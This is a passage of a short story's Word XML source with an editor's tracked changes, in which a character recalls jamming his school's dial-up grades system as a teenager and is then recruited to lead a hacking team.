          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:del w:id="289" w:author="TextVet" w:date="2016-03-15T12:49:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00BB6CAD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">hat </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:ins w:id="290" w:author="TextVet" w:date="2016-03-15T12:50:00Z">
        <w:r w:rsidR="00BB6CAD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>prompt</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="291" w:author="TextVet" w:date="2016-03-15T12:50:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00BB6CAD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>need</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="292" w:author="TextVet" w:date="2016-03-15T12:49:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00BB6CAD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to enter a teacher’s username and password to change any grades</w:t>
      </w:r>
      <w:ins w:id="293" w:author="TextVet" w:date="2016-03-15T12:48:00Z">
        <w:r w:rsidR="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="294" w:author="TextVet" w:date="2016-03-15T12:48:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="295" w:author="TextVet" w:date="2016-03-15T12:49:00Z">
        <w:r w:rsidR="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he’d nearly</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="296" w:author="TextVet" w:date="2016-03-15T12:49:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and was about</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="297" w:author="TextVet" w:date="2016-03-15T12:49:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>give</w:t>
      </w:r>
      <w:ins w:id="298" w:author="TextVet" w:date="2016-03-15T12:49:00Z">
        <w:r w:rsidR="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>n</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> up.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B6BB6" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="299" w:author="TextVet" w:date="2016-03-15T12:57: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then he</w:t>
      </w:r>
      <w:ins w:id="300" w:author="TextVet" w:date="2016-03-15T12:54:00Z">
        <w:r w:rsidR="000005FF">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noticed that the main screen displayed, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>NUMBER OF CURRENT USERS</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">,” and the number wasn’t </w:t>
      </w:r>
      <w:ins w:id="301" w:author="TextVet" w:date="2016-03-15T12:59:00Z">
        <w:r w:rsidR="00A73FA8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>falling</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="302" w:author="TextVet" w:date="2016-03-15T12:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A73FA8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>going down</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Danny </w:t>
      </w:r>
      <w:ins w:id="303" w:author="TextVet" w:date="2016-03-15T12:54:00Z">
        <w:r w:rsidR="000005FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">had </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">discovered, through sheer luck, that the grades system’s connection-handling software had a flaw: if he simply hung up without logging out, the system would think his connection was still open. </w:t>
      </w:r>
      <w:ins w:id="304" w:author="TextVet" w:date="2016-03-15T12:55:00Z">
        <w:r w:rsidR="000005FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>G</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="305" w:author="TextVet" w:date="2016-03-15T12:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000005FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Danny g</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uess</w:t>
      </w:r>
      <w:ins w:id="306" w:author="TextVet" w:date="2016-03-15T12:55:00Z">
        <w:r w:rsidR="000005FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="307" w:author="TextVet" w:date="2016-03-15T12:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000005FF">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that the system could only handle so many connections at a time, </w:t>
      </w:r>
      <w:ins w:id="308" w:author="TextVet" w:date="2016-03-15T12:55:00Z">
        <w:r w:rsidR="000005FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Danny had</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="309" w:author="TextVet" w:date="2016-03-15T12:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000005FF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>so he</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> started calling and disconnecting </w:t>
      </w:r>
      <w:ins w:id="310" w:author="TextVet" w:date="2016-03-15T12:57:00Z">
        <w:r w:rsidR="00041C06">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>again</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="311" w:author="TextVet" w:date="2016-03-15T12:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B8272B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>over</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:del w:id="312" w:author="TextVet" w:date="2016-03-15T12:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B8272B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">over </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">again. He was right – it would accept no more than 255 simultaneous users, at which point it simply stopped answering incoming calls. Victory! The school’s teachers couldn’t enter their grades anymore!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school </w:t>
      </w:r>
      <w:ins w:id="313" w:author="TextVet" w:date="2016-03-15T12:58:00Z">
        <w:r w:rsidR="002B6BB6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>would</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="314" w:author="TextVet" w:date="2016-03-15T12:57:00Z">
        <w:r w:rsidR="002B6BB6">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fix</w:t>
      </w:r>
      <w:del w:id="315" w:author="TextVet" w:date="2016-03-15T12:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002B6BB6">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it by rebooting the machine, but Danny jammed it again the next day. He kept this up for a few weeks until his parents got the phone bill.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“Uh, Jason, I’ll be honest,” said Danny. “My skills might be a little rusty.”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“Don’t worry. I’ve already assembled a team,” said Jason. “I’ll introduce you tomorrow. Three other guys. Very skilled. I want you to lead them. What do you say?”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away. “I don’t know.”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“What’s not to know?” Jason asked. “I can plainly see you practically beaming at the idea.”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w:t>
      </w:r>
      <w:ins w:id="316" w:author="TextVet" w:date="2016-03-15T13:06:00Z">
        <w:r w:rsidR="003F14EA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sitantly, he</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="317" w:author="TextVet" w:date="2016-03-15T13:06:00Z">
        <w:r w:rsidR="003F14EA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>issued</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="318" w:author="TextVet" w:date="2016-03-15T13:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008D075B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said hesitantly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, “What you’re asking for is illegal.”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“Which is exactly why I need someone I can work closely with,” said Jason. “Someone I can trust. Danny, I know there are professional hacker organizations out there — </w:t>
      </w:r>
      <w:ins w:id="319" w:author="TextVet" w:date="2016-03-15T13:08:00Z">
        <w:r w:rsidR="00E929EA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">even </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="320" w:author="TextVet" w:date="2016-03-15T13:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006B69D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">there are </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">entire companies </w:t>
      </w:r>
      <w:del w:id="321" w:author="TextVet" w:date="2016-03-15T13:07:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006B69D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>that</w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E929EA">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do information security operations. But the legitimate ones won’t take on a project like this, and the illegitimate ones are, um, not the kind of people I want to do business with. I need someone I already have an established working relationship with — and technically you’ve been on my payroll for the last six years. I need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Me</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? But… I don’t think I’m…” he stammered. “Look, Jason, the skills for </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>building</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> data systems aren’t the same as the skills for </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>breaking</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> them. It’s a different mindset.”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w:t>
      </w:r>
      <w:ins w:id="322" w:author="TextVet" w:date="2016-03-15T13:09:00Z">
        <w:r w:rsidR="00606EDC">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you don’t think you</w:t>
      </w:r>
      <w:ins w:id="323" w:author="TextVet" w:date="2016-03-15T13:09:00Z">
        <w:r w:rsidR="008B4C46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00566952" w:rsidRPr="00566952">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="324" w:author="TextVet" w:date="2016-03-15T13:09:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>can</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="325" w:author="TextVet" w:date="2016-03-15T13:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B4C46">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>’d be able to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="326" w:author="TextVet" w:date="2016-03-15T13:09:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the job?” Jason asked</w:t>
      </w:r>
      <w:ins w:id="327" w:author="TextVet" w:date="2016-03-15T13:08:00Z">
        <w:r w:rsidR="00134BC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, checking a warning tone</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can </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>absolutely</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> do the job!” Danny replied. “I… I’ll have to think about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gave a crisp nod. “You think. I’ll go get a beer.”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left the table. For several moments</w:t>
      </w:r>
      <w:ins w:id="328" w:author="TextVet" w:date="2016-03-15T13:11:00Z">
        <w:r w:rsidR="00F10AFC">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Danny sat limply, listening to the atonal </w:t>
      </w:r>
      <w:del w:id="329" w:author="TextVet" w:date="2016-03-15T13:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C039B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">electronic </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">background </w:t>
      </w:r>
      <w:commentRangeStart w:id="330"/>
      <w:ins w:id="331" w:author="TextVet" w:date="2016-03-15T13:10:00Z">
        <w:r w:rsidR="00C039B7" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>electronic</w:t>
        </w:r>
        <w:r w:rsidR="00C039B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>a</w:t>
        </w:r>
      </w:ins>
      <w:commentRangeEnd w:id="330"/>
      <w:ins w:id="332" w:author="TextVet" w:date="2016-03-15T13:11:00Z">
        <w:r w:rsidR="00C039B7">
          <w:rPr>
            <w:rStyle w:val="CommentReference"/>
          </w:rPr>
          <w:commentReference w:id="330"/>
        </w:r>
      </w:ins>
      <w:del w:id="333" w:author="TextVet" w:date="2016-03-15T13:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C039B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
